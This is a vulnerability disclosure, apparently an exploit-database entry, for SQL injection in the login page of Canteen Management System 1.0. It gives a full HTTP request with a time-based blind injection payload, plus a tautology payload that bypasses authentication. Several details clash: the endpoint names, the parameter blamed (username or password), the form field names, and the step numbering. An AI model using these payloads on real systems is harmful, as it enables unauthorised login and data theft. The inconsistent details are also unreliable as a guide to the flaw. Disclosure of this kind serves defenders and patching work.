# Canteen Management System - login.php 'medicine' SQL inject

#### Exploit Title: Canteen Management System - login.php 'medicine' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

#### Software Link:https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

#### Version: Canteen Management System 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Canteen Management System does not filter the content correctly at the "login.php /username" parameter, resulting in the generation of SQL injection.

#### Payload used:

```POST /medicine_details.php HTTP/1.1
POST /login.php HTTP/1.1
Host: 192.168.67.10:8091
Content-Length: 97
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.67.10:8091
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.67.10:8091/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=g1diqn5ba9l5npktcpl5jc287t
Connection: close

username=1' AND (SELECT 6691 FROM (SELECT(SLEEP(5)))slLY) AND 'lrcD'='lrcD&password=123456&login=
```

#### Proof of Concept

1、Grab the package at the login and find that the login program is in login php

![](D:\cves\youthappam\images\login.png)

2、Looking at the source code, it is found that the password field is directly brought into the SQL statement query without filtering

![](D:\cves\youthappam\images\usernamesouce.png)

3、Use payload "sleep (10)" for blind SQL injection.It is found that the time blind injection is successful

![usernameburp](D:\cves\youthappam\images\usernameburp.png)

4、We can also construct a payload for universal password login

payload:`email=manager%40manager.com&password=1'or '1'='1&managerLogin=`

![usernameloginsuccess](D:\cves\youthappam\images\usernameloginsuccess.png)

4、Through testing with the tool, it is found that there are other injection methods such as blind SQL time injection.

![usernamesqlmap](D:\cves\youthappam\images\usernamesqlmap.png)

